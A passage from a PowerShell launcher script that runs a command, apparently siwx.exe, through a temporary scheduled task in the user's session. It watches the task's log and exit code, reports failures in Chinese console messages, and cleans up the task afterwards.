                $state = (Get-ScheduledTask -TaskName $currentTask).State.ToString()
                if ($state -notin @('Running', 'Queued')) {
                    if (-not $stoppedAt) { $stoppedAt = Get-Date }
                    if (((Get-Date) - $stoppedAt).TotalSeconds -ge 3) {
                        $info = Get-ScheduledTaskInfo -TaskName $currentTask
                        Show-SiwxTaskEvents $currentTask $started
                        $reason = (ConvertFrom-ConsoleText '\u8bf7\u68c0\u67e5\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u548c\u8bca\u65ad\u65e5\u5fd7\u3002')
                        if ([long]$info.LastTaskResult -eq 3221225786) {
                            $reason = (ConvertFrom-ConsoleText '0xC000013A\uff1a\u5de5\u4f5c\u8fdb\u7a0b\u6536\u5230\u63a7\u5236\u53f0\u4e2d\u65ad\uff0c\u5177\u4f53\u4e2d\u65ad\u6765\u6e90\u5c1a\u672a\u786e\u5b9a\u3002')
                        }
                        throw (ConvertFrom-ConsoleText "\u5de5\u4f5c\u8fdb\u7a0b\u672a\u8fd4\u56de\u7ed3\u679c\u5373\u505c\u6b62\u3002\u4efb\u52a1=$currentTask\uff0c\u7ed3\u679c=$($info.LastTaskResult)\u3002$reason")
                    }
                } else { $stoppedAt = $null }
                if (-not (Test-Path -LiteralPath $logPath) -and ((Get-Date) - $started).TotalSeconds -gt 30) {
                    Show-SiwxTaskEvents $currentTask $started
                    $info = Get-ScheduledTaskInfo -TaskName $currentTask
                    throw (ConvertFrom-ConsoleText "30 \u79d2\u5185\u672a\u6536\u5230\u8f93\u51fa\u3002\u4efb\u52a1=$currentTask\uff0c\u72b6\u6001=$state\uff0c\u7ed3\u679c=$($info.LastTaskResult)\u3002")
                }
                Start-Sleep -Milliseconds 300
            }
            if ($detached) {
                # Explicit background ownership transfer: finally must not stop this task.
                $currentTask = $null
                continue
            }
            if ($stopRequested) {
                Stop-ScheduledTask -TaskName $currentTask
                Write-Host (ConvertFrom-ConsoleText "`n\u5df2\u6309\u8981\u6c42\u505c\u6b62\u3002")
            } else {
                Show-SiwxOutput $logPath ([ref]$position) $true
                $result = Get-Content -LiteralPath $resultPath -Raw
                Write-Host (ConvertFrom-ConsoleText "`n\u547d\u4ee4\u9000\u51fa\u7801\uff1a$($result.Trim())")
                if ($isProbe) {
                    if ($result.Trim() -ne '0') { throw (ConvertFrom-ConsoleText '\u7528\u6237\u4f1a\u8bdd CMD \u81ea\u68c0\u5931\u8d25\uff0c\u5c1a\u672a\u8fd0\u884c siwx.exe\u3002') }
                    $nextCommand = '1'
                } elseif ($result.Trim() -ne '0') {
                    Show-SiwxTaskEvents $currentTask $started
                }
            }
            Unregister-ScheduledTask -TaskName $currentTask -Confirm:$false
            $currentTask = $null
        }
    } catch {
        Write-Host ((ConvertFrom-ConsoleText "\u9519\u8bef\uff1a") + $_.Exception.Message) -ForegroundColor Red
    } finally {
        [Net.ServicePointManager]::SecurityProtocol = $previousTls
        if ($currentTask) {
            Stop-ScheduledTask -TaskName $currentTask -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName $currentTask -Confirm:$false -ErrorAction SilentlyContinue
        }
        if ($bridgeDirectory) {
            Write-Host (ConvertFrom-ConsoleText "\u79c1\u5bc6\u8bca\u65ad\u76ee\u5f55\uff1a$bridgeDirectory")
            Write-Host (ConvertFrom-ConsoleText '\u65e5\u5fd7\u53ef\u80fd\u5305\u542b\u79c1\u5bc6\u8d26\u53f7\u8def\u5f84\uff0c\u8bf7\u59a5\u5584\u4fdd\u7ba1\u3002')
        }
    }
}
